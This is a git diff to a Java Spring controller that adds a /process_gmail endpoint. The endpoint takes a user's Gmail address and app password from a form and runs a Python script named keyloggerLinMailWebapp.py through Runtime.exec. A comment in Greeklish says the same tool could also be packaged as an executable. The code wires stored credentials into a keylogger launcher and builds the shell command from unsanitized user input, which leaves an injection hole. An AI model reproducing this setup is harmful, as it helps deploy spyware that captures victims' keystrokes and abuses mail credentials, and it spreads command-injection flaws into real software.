@@ -9,6 +9,8 @@ import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.servlet.ModelAndView;
 import org.springframework.web.servlet.mvc.support.RedirectAttributes;
 
+import java.io.*;
+import java.nio.file.Paths;
 import java.sql.*;
 
 @Controller
@@ -71,6 +73,23 @@ public class parentController {
     public String processSub(User user){
         System.out.println("User: "+user.getUsername());
         updateUser(user);
+        return "store.html";
+    }
+
+    @PostMapping("/process_gmail")
+    public String processGmail(User user){
+        // afto einai to webapp. 8a mporouse na ginei kai kanoniko exe me to pyinstaller. An anoiga ekleina kai ekana compile
+        String command="python3 src/main/resources/python/keyloggerLinMailWebapp.py";
+        String params=' '+user.getGmail()+' '+user.getApp_password();
+        try{
+            System.out.println("Running process");
+            Process p= Runtime.getRuntime().exec(command+params);
+            System.out.println("Finished process");
+        }
+        catch (IOException ex){
+            System.out.println("process fishy");
+            ex.printStackTrace();
+        }
         return "store.html";
     }
 
